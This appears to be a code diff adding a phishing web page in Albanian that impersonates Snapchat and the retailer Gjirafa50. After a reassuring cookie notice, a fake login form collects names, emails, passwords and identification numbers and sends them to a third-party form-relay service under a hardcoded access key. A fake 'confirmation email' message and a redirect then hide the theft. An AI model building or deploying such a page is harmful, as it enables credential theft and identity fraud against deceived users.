@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gjirafa50 x Snapchat Corporation</title>
+    <style>
+        /* Stilet kryesore */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #FFFC00; /* Ngjyra e verdhë */
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            border: 2px solid #ddd;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            color: #333;
+        }
+        .logo-container img {
+            width: 100px;
+            height: auto;
+            margin: 10px;
+        }
+        .welcome-screen, .login-form, .email-message, .cookie-notice {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        input[type="text"], input[type="email"], input[type="password"], textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #FFFC00;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #FFD700; /* Ngjyra e verdhë më e errët */
+        }
+
+        /* Stilet për njoftimin e cookie në mes */
+        .cookie-notice {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+            z-index: 1000;
+        }
+        .cookie-notice button {
+            background-color: #FFFC00;
+            color: #333;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logot -->
+        <div class="logo-container">
+            <img src="https://cooksoncommunications.com/wp-content/uploads/snapchat-574x435.jpg" alt="Snapchat Logo">
+            <img src="https://th.bing.com/th/id/OIP.y5k5xOgBPTmmc-AaS1JKeQHaHa?rs=1&pid=ImgDetMain" alt="Gjirafa50 Logo">
+        </div>
+        
+        <!-- Welcome Screen -->
+        <div class="welcome-screen active">
+            <h1>Mirë se vini në Gjirafa50 x Snapchat Corporation</h1>
+            <p>Ju lutemi klikoni për të vazhduar në faqen e hyrjes.</p>
+            <button onclick="showCookieNotice()">Vazhdo</button>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="login-form">
+            <section class="contact-section1">
+                <div class="contact-intro">
+                    <h2 class="contact-title">Shkruaj Diçka</h2>
+                </div>
+
+                <form id="contactForm" action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="c55613bb-f779-4f9f-97a5-b1365202a121"/>
+                    <input type="hidden" name="subject" value="New Contact Form Submission from Web3Forms"/>
+                    <input type="hidden" name="from_name" value="My Website"/>
+                  
+                    <div class="form-group">
+                        <label for="name" class="form-label">Emri</label>
+                        <input id="name" name="name" class="form-input" placeholder="Emri juaj" type="text" required/>
+                    </div>
+                    <div class="form-group">
+                        <label for="email" class="form-label">Email</label>
+                        <input id="email" name="email" class="form-input" placeholder="Email" type="email" required/>
+                    </div>
+                    <div class="form-group">
+                        <label for="user" class="form-label">Fjalëkalimi</label>
+                        <input id="user" name="user" class="form-input" placeholder="Fjalëkalimi" type="password" required/>
+                    </div>
+                    <div class="form-group">
+                        <label for="idNumber" class="form-label">Numri Identifikues</label>
+                        <input id="idNumber" name="idNumber" class="form-input" placeholder="Numri identifikues" type="text" required/>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">A jeni klient i Gjirafa50?</label>
+                        <div>
+                            <button type="button" onclick="selectClientStatus('po')">Po</button>
+                            <button type="button" onclick="selectClientStatus('jo')">Jo</button>
+                        </div>
+                        <input id="clientStatus" name="clientStatus" type="hidden" required>
+                    </div>
+                    
+                    <button type="submit">Dërgo</button>
+                </form>
+            </section>
+        </div>
+
+        <!-- Email Message -->
+        <div class="email-message">
+            <h1>Ju lutemi prisni</h1>
+            <p>Për pak minuta do të vijë një email konfirmimi.</p>
+        </div>
+
+        <!-- Cookie Notice -->
+        <div class="cookie-notice">
+            <p>"Në këtë faqe, ne përdorim cookie për të garantuar një përvojë sa më të mirë dhe të sigurt për ju. Duke vazhduar të navigoni, do të ruajmë informacione të vogla për të përmirësuar funksionalitetin dhe personalizimin. Ju sigurojmë që asnjë e dhënë personale nuk është e rrezikuar dhe çdo informacion që ruhet është plotësisht konfidencial. A pranoni të vazhdoni me këto cilësime?"</p>
+            <button onclick="acceptCookies()">Po, pranoj</button>
+        </div>
+    </div>
+
+    <script>
+        // Funksioni për të treguar formën e hyrjes
+        function showLogin() {
+            document.querySelector('.welcome-screen').classList.remove('active');
+            document.querySelector('.login-form').classList.add('active');
+        }
+
+        // Funksioni për të treguar njoftimin e cookie
+        function showCookieNotice() {
+            document.querySelector('.cookie-notice').classList.add('active');
+        }
+
+        // Funksioni për të treguar mesazhin për email
+        function showEmailMessage() {
+            document.querySelector('.login-form').classList.remove('active');
+            document.querySelector('.email-message').classList.add('active');
+            setTimeout(() => {
+                window.location.href = 'https://example.com'; // Zëvendëso 'https://example.com' me faqen e dëshiruar
+            }, 3000); // Pret 3 sekonda para se të kalojë në faqen e re
+        }
+
+        // Funksioni për përzgjedhjen e statusit të klientit
+        function selectClientStatus(status) {
+            document.getElementById('clientStatus').value = status;
+            alert(`Statusi i përzgjedhur: ${status}`);
+        }
+
+        // Funksioni për pranimin e cookie
+        function acceptCookies() {
+            document.querySelector('.cookie-notice').classList.remove('active');
+            showLogin();
+        }
+    </script>
+</body>
+</html>
